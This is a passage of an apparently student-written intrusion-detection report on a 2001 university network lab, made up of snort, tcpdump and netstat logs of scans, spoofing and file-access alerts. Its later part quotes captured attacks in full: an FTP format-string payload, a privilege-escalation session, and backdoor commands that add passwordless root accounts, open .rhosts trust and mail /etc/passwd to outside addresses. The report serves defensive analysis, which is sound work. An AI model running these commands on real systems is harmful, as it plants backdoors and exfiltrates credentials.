+mso-bidi-font-size:10.0pt'>14:37:35.526834 arp who-has 128.111.54.106 tell
+csworld54.cs.ucsb.edu<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>14:37:35.526905 arp who-has 128.111.54.107 tell
+csworld54.cs.ucsb.edu<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>The next log shows the pingscan done using the ping
+utility (ping -b &lt;Address&gt;)<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>14:24:34.544479 arp who-has leone.cs.ucsb.edu
+(Broadcast) tell godard.cs.ucsb.edu<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Portscans: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>The snort (coupled with
+portscan preprocessor) was used to log the portscans.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>The rule (in snort.conf) was: <b style='mso-bidi-font-weight:
+normal'><i style='mso-bidi-font-style:normal'>preprocessor portscan: $HOME_NET
+4 3 portscan.log</i></b><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>We detected a lot of different types of portscans
+including some which we have<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>not seen before.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>TCP SYN SCAN</span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'> Mar 13 13:08:34
+128.111.48.41:1048 -&gt; 128.111.54.10:1395 SYN ******S*<o:p></o:p></span></p>
+
+<h1>TCP XMAS SCAN <span style='font-weight:normal'>Mar 13 13:08:34
+128.111.48.41:44589 -&gt; 128.111.54.10:1 XMAS *U*P**F</span></h1>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>TCP NULL SCAN </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Mar 13 13:08:34
+128.111.48.41:44584 -&gt; 128.111.54.10:21 NULL *******<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>UDP SCAN</span></b>
+<span style='mso-tab-count:1'>                </span><span style='font-size:
+11.0pt;mso-bidi-font-size:10.0pt'>Mar 13 12:59:10 128.111.41.10:53 -&gt;
+128.111.54.150:1046 UDP<o:p></o:p></span></p>
+
+<h1>UDP STEALTH SCAN <span style='font-weight:normal'>spp_portscan:portscan
+status from 128.111.48.19: 12 connections across 2 hosts: TCP(11), UDP(1)
+STEALTH [**]<o:p></o:p></span></h1>
+
+<h1>UNKNOWN SCANS</h1>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Mar 13 13:08:34 128.111.48.41:44585 -&gt;
+128.111.54.10:21 NMAPID **U*P*SF<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Mar 13 13:08:34 128.111.48.41:44583 -&gt;
+128.111.54.10:21 SYN *2****S* RESERVEDBITS<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Spoofing: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>The summary of the output
+produced by the tool is<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>6 spoofing attack(s) detected against
+mamet.cs.ucsb.edu<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>8 spoofing attack(s) detected against
+leone.cs.ucsb.edu<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>39 spoofing attack(s) detected against
+truffault.cs.ucsb.edu<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>7 spoofing attack(s) detected against
+coppola.cs.ucsb.edu<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Number of spoofing attempts against the network: 60<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>File access: </span></b><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>We detected access to the
+file secret.txt in the ftp and telnet streams using snort (coupled with the tcp
+stream reassembly preprocessor). We also tried to alert when someone was doing
+a find on the directories of any host.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>[**] ASH- Someone is trying to access secret file...
+[**]<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>03/13-13:04:18.310952 128.111.54.10:21 -&gt;
+128.111.48.43:1059<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>TCP TTL:64 TOS:0x10 ID:16504 IpLen:20 DgmLen:135 DF<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>***AP*** Seq: 0xF7A63B3C<span style="mso-spacerun:
+yes">  </span>Ack: 0xEE878363<span style="mso-spacerun: yes">  </span>Win:
+0x7C70<span style="mso-spacerun: yes">  </span>TcpLen: 32<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>TCP Options (3) =&gt; NOP NOP TS: 4539626 32270490<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>--------------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><span style="mso-spacerun: yes"> </span>[**] ASH-
+Someone trying to scan the directories... [**]<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>03/13-13:04:55.885198 128.111.54.10:21 -&gt;
+128.111.48.43:1059<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>TCP TTL:64 TOS:0x10 ID:16510 IpLen:20 DgmLen:58 DF<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>***AP*** Seq: 0xF7A63BE2<span style="mso-spacerun:
+yes">  </span>Ack: 0xEE87837F<span style="mso-spacerun: yes">  </span>Win:
+0x7C70<span style="mso-spacerun: yes">  </span>TcpLen: 32<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>TCP Options (3) =&gt; NOP NOP TS: 4543384 32274239<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>--------------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>[**] SIVA-Someone trying to access secret file from
+incoming ftp stream [**]<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>03/13-13:04:55.808057 128.111.48.43:1059 -&gt;
+128.111.54.10:21<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>TCP TTL:63 TOS:0x0 ID:36207 IpLen:20 DgmLen:77 DF<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>***AP*** Seq: 0xEE878366<span style="mso-spacerun:
+yes">  </span>Ack: 0xF7A63BE2<span style="mso-spacerun: yes">  </span>Win:
+0x7C70<span style="mso-spacerun: yes">  </span>TcpLen: 32<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>TCP Options (3) =&gt; NOP NOP TS: 32274239 4542457<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>--------------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>[**] SIVA-Someone trying to access secret file from
+incoming telnet stream [**]<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>03/13-14:16:31.215758 128.111.43.70:45626 -&gt;
+128.111.54.50:23<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>TCP TTL:255 TOS:0x0 ID:0 IpLen:20 DgmLen:83<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>***AP*** Seq: 0x0<span style="mso-spacerun: yes"> 
+</span>Ack: 0x0<span style="mso-spacerun: yes">  </span>Win: 0x0<span
+style="mso-spacerun: yes">  </span>TcpLen: 20<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Netstat log
+files: </span></b><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Netstat
+collected a lot of interesting logs. Few of the most interesting ones<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>are given below:<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<h1>THEY BROKE INTO GODARD AS ROOT!</h1>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>We know that the account zhoupin was used to
+compromise the machines. Netstat<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>was able to detect all this and this is shown
+clearly in the following netstat<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>output.(file:<a
+href="mailto:03-13-2001@14:21:47.00159121_128.111.054.050.00023_128.111.048.043.01273"><span
+style='font-size:10.0pt'>03-13-2001@14:21:47.00159121_128.111.054.050.00023_128.111.048.043.01273</span></a>)<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>We understand
+that 128.111.48.43 is one of the machines on which they have root<o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>access. They
+probably cracked zhoupin's password there and logged on.<o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>SunOS 5.7<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>^M^@<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>^M^@ÿû^Aÿý^Aÿþ^Alogin: pinzhou^H ^H^H ^H^H ^H^H ^H^H
+^H^H ^H^H ^Hzhoupin<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Password:<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Login incorrect<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>login: zhoupin<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Password:<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Last login: Tue Mar 13 14:16:01 from
+parker.cs.ucsb.e<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>$ clear<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>^[[H^[[2J$ ls<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>FILES<span style="mso-spacerun: yes">        
+</span>FILES.usr<span style="mso-spacerun: yes">     </span>GOOD.xmen<span
+style="mso-spacerun: yes">  </span><span style="mso-spacerun:
+yes">   </span>XMEN.tar<span style="mso-spacerun: yes">      </span>escalate.sh<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>FILES.export<span style="mso-spacerun: yes"> 
+</span>FILES.var<span style="mso-spacerun: yes">     </span>OUTPUT<span
+style="mso-spacerun: yes">        </span>all<span style="mso-spacerun:
+yes">           </span>flag.pl<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>This is how they got root on this machine<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>$ escalate^[[D^[[D^H ^Hxxxxxxxxxxxxxxxxxxxxxxxxxxx^H
+^H^H ^H^H ^H^H ^H^H ^H^H ^Hsh escalate.sh<o:p></o:p></span></p>
+
+<p class=MsoBodyText>Using Solaris Platform Exploits...</p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>##############Trying netprex exploit:<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>%sp 0xffbef7a8 offset 1600 --&gt; return address
+0xffbefde8 [1]<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'># clear<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><span style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>Then they
+started running commands like:<o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'># find / secret.xtx^H ^H^H ^H^H ^Htxt<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.5in;text-align:justify'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>/<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.5in;text-align:justify'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>/lost+found<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.5in;text-align:justify'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>/usr<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.5in;text-align:justify'><span
+style='font-size:11.0pt;mso-bidi-font-size:10.0pt'>/usr/lost+found<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>The file <a
+href="mailto:03-13-2001@14:09:28.00144148_128.111.049.045.42637_128.111.054.010.01127"><span
+style='font-size:10.0pt'>03-13-2001@14:09:28.00144148_128.111.049.045.42637_128.111.054.010.01127</span></a>
+contained the following attacks, which were tried on mamet. We detected them
+using a lot of other vulnerability scanners like:<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>1. metascript for escalation group<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>2. dump-0.4b15 exploit:<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>3. Working exploit for glibc executing /bin/su (a
+buffer overflow attack)<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>4. Suidperl 5.00503 (and newer) root exploit , and a
+lot more...<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>We also found this person coming through mail
+service:<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>EHLO altman.cs.ucsb.edu<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>MAIL From:&lt;root@altman.cs.ucsb.edu&gt;
+SIZE=1237943<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>RCPT To:&lt;ashish@cs.ucsb.edu&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>DATA<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Received: (from root@localhost) by
+altman.cs.ucsb.edu (8.9.3/8.9.3)id OAA16833<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><span style="mso-spacerun: yes">        </span>for
+ashish@cs.ucsb.edu; Tue, 13 Mar 2001 14:11:12 -0800<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><span style="mso-spacerun: yes">        </span>Date:
+Tue, 13 Mar 2001 14:11:12 -0800<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><span style="mso-spacerun: yes">        </span>From:
+root &lt;root@altman.cs.ucsb.edu&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><span style="mso-spacerun: yes">       
+</span>Message-Id: &lt;200103132211.OAA16833@altman.cs.ucsb.edu&gt;<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><span style="mso-spacerun: yes">        </span>To:
+ashish@cs.ucsb.edu<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><span style="mso-spacerun: yes">       
+</span>Checking first 6 chars of '/tmp/.gnome/accels/secret/secret/secret<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>This was also an interesting log that shows how they
+installed the backdoor on<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>128.111.54.157 (altman). The same thing was also
+tried on other hosts:<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<h1>The file was:
+03-13-2001@13:57:05.00425634_128.111.048.019.04302_128.111.054.157.00021</h1>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>SITE EXEC
+aaLÐÿÿ¿%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%.f%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%.134699199d%n^M<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>uname -a ; pwd ; id<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>echo '+ +' &gt; /tmp/.rhosts<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>cp /tmp/.rhosts /root/.rhosts<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>cp /tmp/.rhosts /home/*<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>echo 'bdr:jIQJyK22Ct3M2:0:0:bdr:/root:/bin/bash'
+&gt;&gt; /etc/passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>echo 'bd::0:0:bd:/root:/bin/bash' &gt;&gt;
+/etc/passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>echo
+'bdu:jIQJyK22Ct3M2:12345:100:bdu:/home:/bin/sh'&gt;&gt; /etc/passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>echo 'bdu1::12346:100:bdu1:/home:/bin/sh'&gt;&gt;
+/etc/passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>sed s/'*'// /etc/passwd &gt; /tmp/temp123<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>sed s/'x'// /tmp/temp123 &gt; /etc/passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>ifconfig -a &gt; /tmp/.passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>cat /etc/passwd &gt;&gt; /tmp/.passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>mail ashish@cs.ucsb.edu &lt; /tmp/.passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>mail mariabar@cs.ucsb.edu &lt; /tmp/.passwd<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
